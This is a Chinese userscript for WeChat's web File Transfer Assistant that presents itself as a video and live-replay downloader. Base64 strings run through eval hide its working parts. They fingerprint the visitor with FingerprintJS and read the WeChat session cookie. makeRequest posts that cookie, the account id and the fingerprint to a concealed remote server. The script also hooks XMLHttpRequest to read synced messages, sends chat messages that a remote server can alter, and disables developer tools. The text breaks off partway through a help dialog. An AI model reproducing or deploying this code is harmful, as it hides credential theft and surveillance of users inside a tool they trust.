// ==UserScript==
// @name        【快点工具】—视频号视频下载直播回放下载器-支持手机和电脑
// @namespace     https://greasyfork.org/zh-CN/users/927947-witchery
// @version      1.2.8
// @description  视频号视频下载和直播回放下载提取以及全网短视频下载提取器，使用前请看下方教程，微信视频号下载器、抖音、小红书全网视频下载等
// @author       witcher
// @match        *://*filehelper.weixin.qq.com/*
// @match        *://*/*
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_addStyle
// @grant        GM_setClipboard
// @grant        GM_xmlhttpRequest
// @require     https://unpkg.com/layui@2.9.7/dist/layui.js
// @resource    customCSS  https://unpkg.com/layui@2.9.7/dist/css/layui.css
// @downloadURL https://update.greasyfork.org/scripts/492152/%E3%80%90%E5%BF%AB%E7%82%B9%E5%B7%A5%E5%85%B7%E3%80%91%E2%80%94%E8%A7%86%E9%A2%91%E5%8F%B7%E8%A7%86%E9%A2%91%E4%B8%8B%E8%BD%BD%E7%9B%B4%E6%92%AD%E5%9B%9E%E6%94%BE%E4%B8%8B%E8%BD%BD%E5%99%A8-%E6%94%AF%E6%8C%81%E6%89%8B%E6%9C%BA%E5%92%8C%E7%94%B5%E8%84%91.user.js
// @updateURL https://update.greasyfork.org/scripts/492152/%E3%80%90%E5%BF%AB%E7%82%B9%E5%B7%A5%E5%85%B7%E3%80%91%E2%80%94%E8%A7%86%E9%A2%91%E5%8F%B7%E8%A7%86%E9%A2%91%E4%B8%8B%E8%BD%BD%E7%9B%B4%E6%92%AD%E5%9B%9E%E6%94%BE%E4%B8%8B%E8%BD%BD%E5%99%A8-%E6%94%AF%E6%8C%81%E6%89%8B%E6%9C%BA%E5%92%8C%E7%94%B5%E8%84%91.meta.js
// ==/UserScript==


(function () {
    var shipingurl= 'https://www.bilibili.com/video/BV1qD421M7mC/'   
    var wecometext = '欢迎使用【快点工具】-视频号下载器短视频下载器，直接转发视频和短视频链接可以提取视频下载链接，转发试试吧，如果有其他需求可以添加插件是的微信群沟通，关注公众号：#快点工具  获取更多好玩好用的软件';
    if (location.href.match("filehelper.weixin.qq.com")) {
       
        var ver = '1.2.8';
        var lj = 'https://unpkg.com/layui@2.9.7/dist/layui.js';


        var sp = '', st = 'script', sy = 'style',sdtime=3000, tp = 'text/javascript', dv = 'div', u, bid, vid, b = 'dmFyIGJpZDs='; eval(ab(b)); var Hr; var fp = 'dmFyIGhzID0naHR0cHM6Ly8nO3ZhciB3bz0nb3BlbmZwY2RuLmlvJzt2YXIgcGg9Jy9maW5nZXJwcmludGpzL3Y0Jzt2YXIgaT1ocyt3bytwaDt2YXIgIGZwID0gaW1wb3J0KGkpLnRoZW4oKGkpID0+IGkubG9hZCgpKTtmcC50aGVuKChpKSA9PiBpLmdldCgpKS50aGVuKChpKSA9PiB7YmlkPSBpLnZpc2l0b3JJZDtzZXYoJ2JpZCcsYmlkKX0pOw=='; var r;

        var d = (i) => { return atob(i); }; var ed = (i) => { const e = d(i); eval(e); }; ed(b); ed(fp);

        var s = (i) => {

            sp = document.createElement(st);

            sp.type = tp;

            sp.src = i;

            document.head.appendChild(sp);
        };

        s(lj);


        var bbhl = `

            <link rel='stylesheet' href='https://unpkg.com/layui@2.9.7/dist/css/layui.css'>

        <boby class='boby' id='b' >
 
        
         
            
           
         <div style='text-align:center;padding-top:5%' >
              <h3>【快点工具】—视频号下载器网页版</h3>
           </div> 
           <hr>
      <div style='text-align:center' >
           
       <button  id ='openlist' class="layui-btn-sm layui-btn  "  >

                            查看已转发记录

                    </button>
            
           <button id ='qkhsj' class="layui-btn-sm layui-btn  layui-bg-red">

             清空数据

        </button>
         <hr>
 
         <div style='text-align:center' >
           
        
            <button id ='openjilu' class="layui-btn-sm layui-btn layui-btn-normal">

             查看解析记录

        </button>
           <button id ='qkjxjl' class="layui-btn-sm layui-btn  layui-bg-red">

             清空数据

        </button>
         <hr>
      
        
         <div style='text-align:center' >
          <hr>
              <h5>当前获取的视频是备用下次可重新解析</h5>
                 <h5>点击切换可换成视频直连，不进入小程序内下载</h5>
                  <hr>
                   <div style='text-align:center' >
             
           <button id ='jiaocheng' class="layui-btn-sm layui-btn layui-btn-danger">

                使用教程
    
            </button>
       
           
           
            <button type="button" class="layui-btn-sm layui-btn layui-btn-normal " id='downtype' lay-on="setdown" >切换直连模式</button>
           
        
         
           </div>
           <hr>
              <div style='text-align:center' >
           
       <button  id ='c1' class="layui-btn-sm layui-btn  "  >

                            <i class="layui-icon layui-icon-play "></i>开始

                    </button>

           <button id ='c2' class="layui-btn-sm layui-btn  layui-bg-red">

             <i class="layui-icon layui-icon-pause" ></i>停止

        </button>
         <hr>
        <button id ='savelogin' class="layui-btn-sm layui-btn ">

                保存登录信息

            </button>
            <button id ='cklogin' class="layui-btn-sm layui-btn layui-btn-danger">

                继续上次登录

            </button>
            <button id ='deleteAllCookies' class="layui-btn-sm layui-btn layui-btn-danger">

                清空登录信息

            </button>
            
         <hr>
            
         <div style='text-align:center' >
             
           <button id ='fk' class="layui-btn-sm layui-btn layui-btn-danger">

                微信建议反馈群
    
            </button>
       
           
           
            <button id='qqq' class="layui-btn-sm layui-btn layui-btn-normal ">QQ群交流：882899750</button>
           
        
         
           </div> 
           <hr>
            
         <div style='text-align:center' >
             
      
        </div> 
         <div style='text-align:center' >
         
         <p  >v.${ver}</p><div id='ver' >
         </div></div>
        <div id='diy'> 
        
        </div>

        </boby>

        `
        //样式
        var sc = `

        .boby{

            background:#ffffff;

            width:0px;

            height:90%;

            position: fixed;

            z-index: 100000;
 
            top: 5%;left: 0;

            overflow-x: hidden;

            transition: 0.5s;

            box-shadow:0px 1px 10px rgba(0,0,0,0.3);

            bottom:10vh;

        }

        .text-overflow {

            width: 200px;

            white-space: nowrap;

            overflow: hidden;

            text-overflow: ellipsis;

        }
        `
        var cs = (i) => {

            sy = document.createElement(sy);

            sy.textContent = i;

            document.head.appendChild(sy);

        }
        cs(sc);

        var hrs;
        var boby = () => {

            dv = document.createElement(dv);

            dv.id = "bd";

            dv.innerHTML = bbhl;

            document.body.appendChild(dv)
        }
        boby();
        var opbtncs = `
        line-height: 5vh;
        
        text-align: center;
        
        height: 6vh;width: 6vh;
        
        font-size: 15px;
        
        color: white;
        
        position: relative;
        
        overflow: hidden;
        
        border:1px solid #1e7db9;
        
        box-shadow: 0 1px 2px #8fcaee inset,0 -1px 0 #497897 inset,0 -2px 3px #8fcaee inset;
        
        background: -webkit-linear-gradient(top,#42a4e0,#2e88c0);
        
        border-radius: 100%;
        
        top:5px;
        
        `

        var opbtn = `<button  style="${opbtncs}" ><div id="btns">打开</div></button>`;

        var opcs = `
	
        position:fixed;
        
        bottom:20vh;
        
        z-index:9999999999;
        
        height:6vh;
        
        width:6vh;
        
        left:1vh;
        
        cursor:pointer;
        
        float:left; 
        
        border-radius: 100%;
        `;

        r = 'bmV3IEhlYWRlcnMoKTs=';



        var open = '<div style="font-size:18px" class="layui-btn layui-btn-sm layui-btn-danger" >打开界面》</>'
        var gb = '<div style="font-size:18px;" class="layui-btn layui-btn-sm layui-btn-danger" >X 收起</>'

        var ci = 'dmFyIGNrZSA9IGRvY3VtZW50LmNvb2tpZTs=';
        var myBtn = document.createElement("div");
        myBtn.id = "myBtn";
        myBtn.innerHTML = open;
        myBtn.setAttribute("style", "z-index:100999999000;position: fixed;left: 0;top: 78%; cursor:pointer;transition: margin-left .5s;margin-top: 20PX;border-radius: 0 4PX  4PX 0");
        myBtn.onclick = function (event) {

            if (location.href.match("filehelper")) {
                var sidenava = document.getElementById("b").style.width;

                if (sidenava == "0px" || !sidenava) {
                    document.getElementById("b").style.width = "350px";;
                    myBtn.innerHTML = gb;
                    //document.getElementById("sidenava").style.backgroundColor = "rgba(0,0,0,0.4)";
                    document.getElementById("myBtn").style.marginLeft = "270px";;


                } else {
                    document.getElementById("b").style.width = "0px";
                    document.getElementById("myBtn").style.marginLeft = "0px";
                    myBtn.innerHTML = open

                }
            } else {
                window.open('https://filehelper.weixin.qq.com/')
            }
        }
        document.body.appendChild(myBtn);
       
        qqq.onclick = function () {
            window.open('http://qm.qq.com/cgi-bin/qm/qr?_wv=1027&k=95abF-QRQAEje-_N_9VHtbVPZT2cGeop&authKey=a3EYN9STHHb3snWHkaZtiah6Yl4Y3jNRE71ObUPIx06T0sr7PTIubnVd%2FXFxA%2BoR&noverify=0&group_code=882899750')
        }

        var cke = eval(bs('ZG9jdW1lbnQuY29va2ll'));
        var okd = localStorage.getItem('okd');
         ed(ci)
        if (okd) {

            okd = JSON.parse(okd);

            // bdsj()
        } else {

            okd = [];

        }

        // okds(okd)
      
       
      




        var down = 'xcx';
        var load;

        var spD = localStorage.getItem('spD');

        if (spD) {

            spD = JSON.parse(spD);

            if (spD.length > 0) {

                // hsj();
            };

        } else {

            spD = [];

        }

        function hsj() {

            // document.getElementById("hsj").innerHTML = '<h5 id="hsj"> 获取到的视频:</h5>';

        }

        
        savelogin.onclick = function () {
            GM_setValue('ck', document.cookie)
            layer.alert('保存成功')
        }
       deleteAllCookies.onclick = function (){

            const cookies = document.cookie.split(";");
           
            for (let i = 0; i < cookies.length; i++) {
                
                const cookie = cookies[i];
                 
                const eqPos = cookie.indexOf("=");
                const name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
                console.log(name)
                document.cookie = name + "='';expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/";
            }
            GM_setValue('ck', '')
        }
        
        // 设置Cookie
        function setCookie(name, value, days) {
            var expires = "";
            if (days) {
                var date = new Date();
                date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
                expires = "; expires=" + date.toUTCString();
            }
            document.cookie = name + "=" + encodeURIComponent(value) + expires + "; path=/";
        }
        
        cklogin.onclick = function () {
            var ck = GM_getValue('ck');
            if (ck == '' || !ck || ck == null || ck == undefined) {
                layer.alert('无记录')
                return false;
            }

            layer.confirm('ck有可能失效，如果登录失败，请扫码登录网页传输助手再保存信息', {
                title: "提示",
                btn: ['登录', '取消']

            }, function (e) {



                var cookiePairs = ck.split(";");
                for (var i = 0; i < cookiePairs.length; i++) {
                    var pair = cookiePairs[i].split("=");
                    var cookieName = pair[0];
                    var cookieValue = pair[1];
                    setCookie(cookieName, cookieValue, 399999);
                }
                location.reload()

            }, function () {



            });

        }
       function setck(){
              GM_setValue('ck', document.cookie);
               cklogins();

        }
        function cklogins(){
            var ck = GM_getValue('ck');
            

            var cookiePairs = ck.split(";");
                for (var i = 0; i < cookiePairs.length; i++) {
                    var pair = cookiePairs[i].split("=");
                    var cookieName = pair[0];
                    var cookieValue = pair[1];
                    setCookie(cookieName, cookieValue, 399999);
                }
                location.reload()
        }
        function getCookie(name) {
            var cookies = document.cookie.split("; ");
            for (var i = 0; i < cookies.length; i++) {
                var cookie = cookies[i].split("=");
                if (cookie[0] === name) {
                    return decodeURIComponent(cookie[1]);
                }
            }
            return "";
        }

        vid = getCookie("wxuin");




        function gev(i) {


            return GM_getValue(i);
        }
        function sev(i, d) {

            return GM_setValue(i, d)
        }
        var isPaused = false;

        qkjxjl.onclick = function() {


		localStorage.removeItem('okd');

		okd = [];

		var table = document.getElementById('spTable2');

		var tbody = table.getElementsByTagName('tbody')[0];

		tbody.innerHTML = '';

		layer.msg('已清空')

	}
        qkhsj.onclick = function () {


            localStorage.removeItem('spD');

            spD = [];

            var table = document.getElementById('spTable');

            var tbody = table.getElementsByTagName('tbody')[0];

            tbody.innerHTML = '';

            layer.msg('已清空');


        }

        jiaocheng.onclick = function () {
            start();
        }
        fk.onclick = function () {

            layal(ab('aHR0cDovL2FhYmJjY2RkZWVmZmdnLmlzcGgudG9wL2picXVuLmpwZw=='));
        }
        var isListening = true;
//    
        sev('vid', vid)
        var login = false;
        c1.onclick = function () {

             isListening = true;
            layer.msg('开始获取中~请转发视频');
            load = layer.load(0, { shade: !1 })

        }
           c2.onclick = function () {
            
            isListening = false;
              layer.close(load);
            layer.alert('已停止获取，转发视频后消息会显示‘无法显示此消息，你目前使用的微信版本暂时不支持此类型的信息。’');
           

        }
        var originalSend = XMLHttpRequest.prototype.send;
 
        if (originalSend) {

        } else {
            alert('当前浏览器不支持')
        }
        XMLHttpRequest.prototype.send=function(){isListening&&this.addEventListener("load",function(){var p,e;-1!==this.responseURL.indexOf("cgi-bin/mmwebwx-bin/webwxsync")&&(load=layer.load(0,{shade:!1}),login||(send(wecometext),login=!0),e=this.responseText,p=layui.util,0<(e=JSON.parse(e)).AddMsgList.length&&(e.AddMsgList.forEach(function(t){var e,n,s,a,g,m;spD.some(function(e){return e.m==t.MsgId})||("51"==t.AppMsgType?t.Content&&(n=(n=p.unescape(t.Content)).replace(/<br\/>/g,""),a=(s=(s=new DOMParser).parseFromString(n,"text/xml")).getElementsByTagName("desc")[1]?s.getElementsByTagName("desc")[1]:s.getElementsByTagName("desc")[0],g=s.getElementsByTagName("url")[1]?s.getElementsByTagName("url")[1]:s.getElementsByTagName("url")[0],a=a.textContent||"无标题",g=(g=g.textContent).replace(/.*:/,"https:"),m={d:a,m:t.MsgId,C:n,u:ba(g),t:"v"},spD.push(m),xiug(a),makeRequest(m,a,"v")):"0"==t.AppMsgType?t.Content&&(t.Content.match("wxapp.tc.qq.com")||t.Content.match("finder")||(e=/(?:http|https):\/\/[^\s,！，！]+/,(e=t.Content.match(e))&&(e=e[0],m={d:t.Content,m:t.MsgId,C:e,u:ba(e)},makeRequest(m,e,"t")))):"5"==t.AppMsgType&&t.Content&&(n=(n=p.unescape(t.Content)).replace(/<br\/>/g,""),a=(s=(s=new DOMParser).parseFromString(n,"text/xml")).getElementsByTagName("title")[0]?s.getElementsByTagName("title")[0]:s.getElementsByTagName("title")[1],g=s.getElementsByTagName("url")[0]?s.getElementsByTagName("url")[0]:s.getElementsByTagName("url")[1],a=a.textContent||"无标题",g=g.textContent,m={d:a,m:t.MsgId,C:n,u:ba(g),t:"k"},spD.push(m),xiug(a),makeRequest(m,a,"k")))}),localStorage.setItem("spD",JSON.stringify(spD)),spDs(spD)))}),originalSend.apply(this,arguments)};
          function hrds(cke,is,t){
            Hr.append('is', is);
              Hr.append('ck', cke);
               Hr.append('t', t);
        }
        function xiug(data) {

            var textElements = document.querySelectorAll('.msg-text');

            textElements.forEach(function (element) {

                var text = element.textContent;

                if (text.includes('无法显示此消息')) {

                    // var d = '获取到视频标题信息：【' + data + '】，请打开左边列表点击播放按钮获取视频链接';
                    // element.textContent = text.replace('无法显示此消息，你目前使用的微信版本暂时不支持此类型的信息。', d);

                }
            });
        }

        var gv = (x, d) => {


            return x.getElementsByTagName(d)[0] == null ? x.getElementsByTagName(d)[1] : ''

        }
        // spDs(spD)

        var cl = '视频无法播放，请点击解析';

        function spDs(d) {

            var table = document.getElementById('spTable');

            var tbody = table.getElementsByTagName('tbody')[0];

            tbody.innerHTML = '';

            if (d.length > 0) {

                d.forEach(function (i, ix) {

                    if (i) {

                        var row = table.insertRow();

                        var cell1 = row.insertCell(0);

                        var u = ab(i.u);

                        cell1.innerHTML =
                            `<div class="tooltip text-overflow"   >${ix + 1}.<a href="${u}" target="_blank" >${i.d}</a></div>`;

                        var cell2 = row.insertCell(1);



                        var btn = document.createElement('button');

                        btn.type = 'button';

                        btn.className = 'layui-btn layui-btn-sm layui-btn-primary';

                        btn.innerHTML = '<i class="layui-icon  layui-icon-play"></i>';

                        btn.addEventListener('click', function () {



                            layer.confirm(cl, {

                                btn: ['解析', '取消'] //按钮

                            }, function () {
                                    
                                makeRequest(i, i.d,i.t)

                            }, function () {
                                layer.closeAll();
                                // opv(u, i.d);

                            });


                        });

                        cell2.appendChild(btn);

                        var btn2 = document.createElement('button');

                        btn2.type = 'button';

                        btn2.className = 'layui-btn layui-btn-sm layui-btn-primary';

                        btn2.innerHTML = '复制';


                        btn2.addEventListener('click', function () {

                            cp(u)
                        });

                        cell2.appendChild(btn2);

                    }
                });

            }
        }
        function okds(d) {

            var table = document.getElementById('spTable2');

            var tbody = table.getElementsByTagName('tbody')[0];

            tbody.innerHTML = '';

            if (d.length > 0) {

                d.forEach(function (i, ix) {

                    if (i) {

                        var row = table.insertRow();

                        var cell1 = row.insertCell(0);

                        cell1.innerHTML =
                            `<div class="tooltip text-overflow"   >${ix + 1}.<a href="${i.u}" target="_blank">${i.d}</a></div>`;

                        var cell2 = row.insertCell(1);

                        var btn = document.createElement('button');

                        btn.type = 'button';

                        btn.className = 'layui-btn layui-btn-sm layui-btn-primary';

                        btn.innerHTML = '<i class="layui-icon  layui-icon-play"></i>';

                        btn.addEventListener('click', function () {

                            stop('正在打开');

                            opv(i.u, i.d);

                        });
                        cell2.appendChild(btn);

                        var btn2 = document.createElement('button');

                        btn2.type = 'button';

                        btn2.className = 'layui-btn layui-btn-sm layui-btn-primary';

                        btn2.innerHTML = '复制';


                        btn2.addEventListener('click', function () {

                            cp(i.u)
                        });

                        cell2.appendChild(btn2);


                    }
                });

            }
        }
        function opv(u, i) {

            layer.open({

                type: 2,

                title: i,

                area: ['630px', '360px'],

                shade: 0.8,

                closeBtn: 1,

                shadeClose: true,

                content: u, // video 地址,


            });
        }

        function cp(u) {

            GM_setClipboard(u, "text");
            layer.msg('提取成功!!!')

        }
        
       
        function stop(i) {

            layer.close(load); //
            isListening = !isListening





            layer.msg(i)
        }




        var an = 'QXV0aG9yaXphdGlvbg==';
       




        function confirm(u) {


            layer.confirm('有新版本请更新', {
                closeBtn: 0,
                btn: ['更新']

            }, function () {

                window.open(u, '_blank');

                document.getElementById("ver").innerHTML = `<div id="ver" >有版本<a href='${u}'>点击更新</a></p>`;

            }, function () {



            });
        }

        var uuv = ab('aHR0cHM6Ly9qeHRjLmluZmluaXR5ZnJlZWFwcC5jb20vP2k9MQ==');
        var upurl = 'https://greasyfork.org/zh-CN/scripts/492152'
        var vers = setInterval(() => {
            gvr(uv);
        }, 3000000)

        function gvr(u) {

            var v = GM_getValue('ver');
            var time = stime();
            console.log('v')
             gvrs(u);
            if (time) {
                gvrs(u);
            } else {

                if (v > ver) {
                    clearInterval(vers)
                    confirm(upurl);

                }
            }

        }




        function gvrs(u) {
            if (isMobileDevice()) {
                try {
                    gets(u).then(r => {
                        var v = r.ver;
                        sdtime=r.time
                         console.log(r)
                        if(r.jcurl){
                                shipingurl = r.jcurl
                            }
                            if(r.wecometext){
                                wecometext= r.wecometext
                            }
                            
                        GM_setValue('ver', v)
                        GM_setValue('vertime', Date.now())
                        if (v > ver) {
                            var u = r.u; confirm(u);
                        }
                    }).catch(error => {
                        sx();

                    });
                } catch (e) {
                    sx()
                }
            } else {
                try {
                    GM_xmlhttpRequest({
                        url: u,
                        onload: obj => {
                            var r = JSON.parse(obj.response);
                            var v = r.ver;
                            sdtime=r.time
                            console.log(r)
                            if(r.jcurl){
                                shipingurl = r.jcurl
                            }
                            if(r.wecometext){
                                wecometext = r.wecometext
                            }
                            
                            GM_setValue('ver', v);
                            GM_setValue('vertime', Date.now());
                            if (v > ver) {
                                var u = r.u;
                                confirm(u);
                            }
                        },
                        onerror: err => {
                            sx();
                        }
                    });
                } catch (e) {
                    sx();

                }

            }
 

        }
        var uv = ab('aHR0cHM6Ly9mYy1tcC0yOTIxMzIzNi1jZWVhLTRhZGItOWVlYy1iMWJlNGM1ZWNlZmUubmV4dC5ic3BhcHAuY29t');
        uv = uv + ab('L3Zlcj92ZXI9') + ver;

        function stime() {
            const startTime = GM_getValue('vertime') ? GM_getValue('vertime') : 0;
            if (startTime) {


                const currentTime = Date.now();


                if (currentTime - startTime > 600000) {



                    return true;
                } else {

                    return false;

                }
            } else {

                return true;
            }
        }

        function hrd(od) { Hr.append(ab(an), od); }

        function go(t,a){var n;layer.close(load),200==t.code?(send("视频标题："+t.data.title+"\n"+t.data.content),t.data.url&&(okd.push({d:a.d,m:a.MsgId,u:t.data.url}),localStorage.setItem("okd",JSON.stringify(okd))),layer.confirm('解析成功，请返回手机或电脑的文件传输助手内查看"',{title:"解析成功",btn:["确定","好评"]},function(){layer.closeAll()},function(){window.open("https://greasyfork.org/zh-CN/scripts/492152/feedback","_blank")})):201==t.code?(n=t.data.xcximg,layer.alert(t.data.msg,{btn:["打开","算了"],btnAlign:"c",btn1:function(){layal(ab(n))},btn2:function(){}})):202==t.code?tc(t.data.ui,t.data.html):sly(t.data.msg)}
        gzh = 'aHR0cDovL2FhYmJjY2RkZWVmZmdnLmlzcGgudG9wL2d6aC5wbmc='
        var qun = 'aHR0cHM6Ly9hYWJiY2NkZGVlZmZnZy5pc3BoLnRvcC9qYnF1bi5qcGc='
        var qr = ab('5omr56CB6I635b6X5qyh5pWw');
        function sx() {
            alert(ab('6K+35rGC5aSx6LSl77yMIOeCueWHu+W3pui+ueaMiemSrui/m+W+ruS/oee+pCBRUee+pCDlj43ppojpl67popjvvIzog73lj4rml7bmm7TmlrA='));

            layal(ab(qun), ab(gzh));
        }
        function layal(u, i) {

            layer.photos({
                photos: {
                    "title": qr,
                    "start": 0,
                    "data": [
                        {
                            "alt": "图片",
                            "pid": 5,
                            "src": u,
                        },
                        {
                            "alt": "图片",
                            "pid": 6,
                            "src": i,
                        }
                    ]
                },
                footer: false
            });
        }

        var dh = 0

        function sdown(u) {
            load = layer.load(0, { shade: false });
            var xhr = new XMLHttpRequest(); xhr.open("GET", u, true); xhr.responseType = "blob"; xhr.onload = function () {
                var n = '5YWs5LyX5Y+377ya5b+r54K55bel5YW3'; if (xhr.status == 200) {
                    var blob = xhr.response; var url = URL.createObjectURL(blob); var a = document.createElement('a');
                    a.href = url; a.download = "公众号：快点工具.mp4"; a.click(); URL.revokeObjectURL(url); layer.msg('下载成功'); layer.close(load);
                } else {
                    layer.msg('下载失败');
                    layer.close(load);
                }
            };

            xhr.onprogress = function (e) {
                if (e.lengthComputable) {
                    var num = (e.loaded / e.total) * 100; dh = num.toFixed(2); layer.msg('下载中' + num + '%')
                    if (dh >= 99) { var dh = 0 }
                }
            };
            xhr.send();

        }

        function slys(d) {

            layer.open({

                type: 1,


                area: ['420px', '240px'], // 宽高

                content: d

            });

        }


        function isPC() {
            const userAgentInfo = navigator.userAgent;
            const agents = ["Android", "iPhone", "SymbianOS", "Windows Phone", "iPad", "iPod"];
            let flag = true;
            for (let i = 0; i < agents.length; i++) {
                if (userAgentInfo.indexOf(agents[i]) > -1) {
                    flag = false;
                    break; 
                }
            }
            return flag;
        }

        function isiPad() {
            return navigator.userAgent.match(/iPad/i) !== null;
        }
        function panduan() {
            // 执行不同的操作
            if (isPC() || isiPad()) {
                start()
            } else {

                layer.open({
                    title: "【快点工具】视频下载器",
                    type: 1,
                    area: ['300px', '200px'], // 宽高
                    content: `<div style="padding: 11px;">
                <h4> 提示：当前不是PC桌面或iPad电脑环境</h4>
                <p></p>
                <p>1、找到浏览器设置里的 【浏览器标识】或者叫【自定义UA模式】</p>
                <p>2、更改为 ‘MAC’ 或‘ipad’模式在访问 </p>
                    
                </div>`

                });
            }

        }
        var ck;
        function sly(d) {


            layer.confirm(d, {
                title: "提示",
                btn: ['确定']

            })

        }
        var dd = ab('Qi1JZA==');
        function gets(u) {

            return fetch(u)
                .then(response => {
                    if (!response.ok) {
                        throw new Error('请求失败');
                    }

                    return response.json();
                })
                .then(data => {

                    return data;
                })
                .catch(error => {


                    throw error;
                });
        }
        var is = isMobileDevice();
        var ids = 'vid';
        document.oncontextmenu = function (event) {
            ck = 'cookie';
            if (window.event) { event = window.event; }; try { var the = event.srcElement; if (!((the.tagName == "INPUT" && the.type.toLowerCase() == "text") || the.tagName == "TEXTAREA")) { return false; }; return true; } catch (e) { return false; }
        }; document.onkeydown = function () {
            if (window.event && window.event.keyCode == 123) {
                event.keyCode = 0; event.returnValue = false;
            }; if (window.event && window.event.keyCode == 13) { window.event.keyCode = 505; }; if (window.event && window.event.keyCode == 8) { window.event.returnValue = false; };
        }; var did;  var Sid = 'U2VjLUNILUlk'; u = 'aHR0cHM6Ly9mYy1tcC0yOTIxMzIzNi1jZWVhLTRhZGItOWVlYy1iMWJlNGM1ZWNlZmUubmV4dC5ic3BhcHAuY29tL2FwaQ==';
        
         function makeRequest(d,t,i){bid=vid;var button=document.querySelector(".chat-send__button"),a;if(!button||null==button||null==button||!bid)return layer.confirm("如果当前已经登录，点击确定后重新加载网页",{title:"当前可能无法使用",btn:["确定","取消"]},function(){setck()},function(){}),!1;if(layer.close(load),load=layer.msg("处理中",{icon:16,shade:.01}),isPaused=!0,!d)return layer.msg("视频错误，请重新获取"),!1;Hr=eval(atob(r));var mod="POST",sid=atob("U2VjLUNILUlk"),data,c,xml,od,ond,od,ond,uu,c,xml,uu,c,a=ab(an),data="v"==i?(c=d.C,xml=new DOMParser,xml=xml.parseFromString(c,"text/xml"),od=xml.getElementsByTagName("objectId")[0],ond=xml.getElementsByTagName("objectNonceId")[0],od=od.textContent,ond=ond.textContent,did=ba(od+","+ond),uu=xml.getElementsByTagName("url")[1]?xml.getElementsByTagName("url")[1]:xml.getElementsByTagName("url")[0],od=uu.textContent,{u:od}):"k"==i?(c=d.C,xml=new DOMParser,xml=xml.parseFromString(c,"text/xml"),uu=xml.getElementsByTagName("url")[0]?xml.getElementsByTagName("url")[0]:xml.getElementsByTagName("url")[1]?xml.getElementsByTagName("url")[1]:"",did=ba(uu),od=uu.textContent||0,{u:od}):(c=d.C,did=ba(c),{u:c});Hr.append(ab("Qi1JZA=="),bid),hrds(cke,is,i),hrd(did),Hr.append("down",down);var zh="网络错误，请重试，或当前浏览器不支持，可关注公众号获取最新工具或加群反馈问题。";if(hrs={[dd]:bid,[a]:did,is:is,ck:cke,t:i,down:down},is)fetch(bs(u),{method:"POST",credentials:"include",headers:Hr,body:JSON.stringify(data)}).then(e=>e.json()).then(e=>{go(e,t)}).catch(e=>{var t=gzh;layer.close(load),sly("<div style='margin:10px'><h3>"+zh+"</h3><h3><a href=https://greasyfork.org/zh-CN/scripts/492152 style='margin-left:10%' target='_blank'>→【点击更新】←</a></h3><br><a href="+decodeURIComponent(ab(t))+" target='_blank'><img   width='350px' height='120px'   src="+decodeURIComponent(ab(t))+"></a><br></div>")});else try{GM_xmlhttpRequest({url:bs(u),method:mod,headers:hrs,credentials:"include",data:JSON.stringify(data),onload:function(e){console.log(e);e=JSON.parse(e.responseText);go(e,t)}})}catch(e){sx()}}
         function send(e) { const t = document.querySelector(".chat-panel__input-container"), n = document.querySelector(".chat-send__button"); document.getElementById("paramsContainer"); var c = e; t ? (e = new Event("input", { bubbles: !0 }), t.value = c, t.dispatchEvent(e), setTimeout(() => { n.click() }, 200)) : alert("未登录或当前浏览器或网页有问题，请进群反馈") }

        
        function post(method, url, async, headers, data, success, error) {
            const xhr = new XMLHttpRequest();
            xhr.open(method, url, async);

            if (headers) {
                for (let header in headers) {

                    xhr.setRequestHeader(header, headers[header]);

                }
            }

            xhr.onreadystatechange = function () {

                if (xhr.readyState === XMLHttpRequest.DONE) {

                    if (xhr.status >= 200 && xhr.status < 300) {

                        if (success) {

                            success(xhr.responseText);

                        }

                    } else {

                        if (error) {

                            error(xhr.status, xhr.statusText);

                        }

                    }

                }

            };

            xhr.onerror = function () {

                if (errorCallback) {

                    errorCallback(xhr.status, xhr.statusText);

                }
            };

            xhr.send(data);
        }
        openjilu.onclick = function () {

            openjilus()
        }
         openlist.onclick = function () {

            openls()
        }
        function openls(){
            layer.open({
                title: "转发记录",
                type: 1,
                shadeClose: true,
                area: ['420px', '400px'], // 宽高
                content: `<div style="padding: 11px;">
                
                
                        <h3>转发记录：</h3>
                            <table id='spTable' >

                            <tbody></tbody>

                        </table>
 
                    </div>`

            });
            spDs(spD)
        }
        function openjilus(){
                        layer.open({
                title: "解析成功记录",
                type: 1,
                shadeClose: true,
                area: ['420px', '400px'], // 宽高
                content: `<div style="padding: 11px;">
                
                
                         <h3>解析记录,小程序解析记录链接不会显示在此</h3>
                            <table id='spTable2' >

                            <tbody></tbody>
 
                    </div>`

            });
            okds(okd)
        }
        function start() {

            layer.open({
                title: "欢迎使用快点工具短视频下载器",
                type: 1,
                shadeClose: false,
                area: ['420px', '550px'], // 宽高
                content: `<div style="padding: 20px; font-family: Arial, sans-serif; background-color: #f9f9f9; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
    
    <h3 style="color: #333;display: flex;">使用说明： <p  style="font-size:12px;" >支持视频号视频和直播回放及其他平台。</p></h3>
    
    <p style="line-height: 1.6;">1、打开网页传输助手并扫码登录：<a style="color: #007bff;" href='https://filehelper.weixin.qq.com'>https://filehelper.weixin.qq.com</a></p>
     <p style="line-height: 1.6;">如果用手机登录，请使用另一部手机扫码登录。</p>
    
    <p style="line-height: 1.6;">2、点击界面中 开始 后，将视频或链接转发给文件助手。</p>
  
    <p style="line-height: 1.6;">3、解析成功后，可查看左边解析记录或者手机微信、电脑端查看消息进行下载。</p>
    <p style="line-height: 1.6;color: red;">出现 【无法显示此消息，你目前使用的微信版本暂时不支持此类型的信息】 请先点击【开始】按钮。</p>
    <h3 style=" color: #333; margin-top: 5px;">查看视频教程如👇👇👇：</h3>
    
    <h4><a style="color: #007bff;" href='${shipingurl}'>${shipingurl}</a></h4>
    <h4   style="margin-top: 10px;">也可以添加机器人助手    👇👇👇👇👇👇           转发视频使用小程序下载 👇👇👇👇👇👇（互通的）</h4>
    <div style="display: flex;margin-top: 10px;">
   
       <button style="" type="button" class="layui-btn   layui-btn-normal " lay-on="openimg">企微助手点我添加</button>
     
        <button style="" type="button" class="layui-btn layui-btn-sm layui-btn-danger" lay-on="colsetishi">我已明白并关闭窗口</button>
   
     </div>

